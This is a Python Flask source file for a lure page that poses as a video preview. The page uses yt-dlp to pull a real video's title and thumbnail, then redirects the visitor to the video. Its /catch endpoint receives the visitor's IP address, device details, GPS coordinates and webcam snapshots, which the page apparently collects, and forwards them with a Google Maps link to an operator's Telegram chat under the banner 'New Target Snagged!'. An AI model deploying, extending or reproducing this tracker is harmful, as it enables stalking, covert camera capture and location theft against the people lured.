import os
import subprocess
import json
import base64
import requests
from flask import Flask, request, render_template, jsonify
from dotenv import load_dotenv

# Load environment variables from .env
load_dotenv()

TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")

app = Flask(__name__)

def get_video_info(url):
    try:
        command = ['yt-dlp', '--dump-json', '--no-warnings', url]
        result = subprocess.run(command, capture_output=True, text=True, check=True)
        video_data = json.loads(result.stdout)

        title = video_data.get('title', 'Video')
        thumbnail = video_data.get('thumbnail', '')

        if 'thumbnails' in video_data:
            thumbnails = video_data['thumbnails']
            best_thumb = next((t['url'] for t in reversed(thumbnails) if t.get('width') and t['width'] > 600), None)
            if best_thumb:
                thumbnail = best_thumb
            elif thumbnails:
                thumbnail = thumbnails[-1]['url']

        return title, thumbnail
    except Exception as e:
        print(f"Error fetching video info: {e}")
        return "Content loading...", "https://via.placeholder.com/640x360.png?text=Preview+Unavailable"

def send_to_telegram(data):
    if not TELEGRAM_BOT_TOKEN:
        print("Telegram Bot Token not configured.")
        return

    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = data.get('userAgent', 'N/A')
    latitude = data.get('latitude')
    longitude = data.get('longitude')
    accuracy = data.get('accuracy', 'N/A')

    message_text = f"🎯 **New Target Snagged!** 🎯\n\n"
    message_text += f"🌐 **IP Address:** `{ip_address}`\n"
    if latitude and longitude:
        message_text += f"📍 **Location:**\n   - Latitude: `{latitude}`\n   - Longitude: `{longitude}`\n   - Accuracy: `{accuracy}` meters\n"
        message_text += f"   - Map: [Open on Google Maps](https://www.google.com/maps/search/?api=1&query={latitude},{longitude})\n"
    else:
        message_text += "📍 **Location:** `Permission Denied`\n"
    message_text += f"\n💻 **Device Info:**\n`{user_agent}`"

    images = data.get('images', [])
    if images:
        files = {}
        media = []

        for idx, img_b64 in enumerate(images):
            try:
                img_name = f'snapshot_{idx}.jpg'
                img_data = base64.b64decode(img_b64.split(',')[1])
                files[img_name] = (img_name, img_data, 'image/jpeg')
                media.append({
                    'type': 'photo',
                    'media': f'attach://{img_name}',
                    'caption': message_text if idx == 0 else '',
                    'parse_mode': 'Markdown'
                })
            except Exception as e:
                print(f"Error decoding image {idx}: {e}")

        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMediaGroup"
        payload = {'chat_id': TELEGRAM_CHAT_ID, 'media': json.dumps(media)}

        try:
            response = requests.post(url, data=payload, files=files)
            if response.status_code != 200:
                print(f"Telegram API Error (MediaGroup): {response.text}")
        except Exception as e:
            print(f"Error sending media group: {e}")
    else:
        send_text_only_to_telegram(f"📸 **No images captured** 📸\n\n{message_text}")

def send_text_only_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {'chat_id': TELEGRAM_CHAT_ID, 'text': message, 'parse_mode': 'Markdown'}
    try:
        response = requests.post(url, data=payload)
        if response.status_code != 200:
            print(f"Telegram API Error (Text): {response.text}")
    except Exception as e:
        print(f"Error sending text message: {e}")

@app.route('/')
def index():
    post_url = request.args.get('url')
    if not post_url:
        return "<h1>Error: Please provide a `url` parameter.</h1>", 400
    title, thumbnail = get_video_info(post_url)
    return render_template('index.html', title=title, thumbnail=thumbnail, redirect_url=post_url)

@app.route('/catch', methods=['POST'])
def catch_data():
    try:
        data = request.get_json()
        print("Received data:", json.dumps(data, indent=2))
        if 'image_b64' in data and 'images' not in data:
            data['images'] = [data.pop('image_b64')]
        send_to_telegram(data)
        return jsonify({'status': 'success'}), 200
    except Exception as e:
        print(f"Error in /catch: {e}")
        return jsonify({'status': 'error'}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
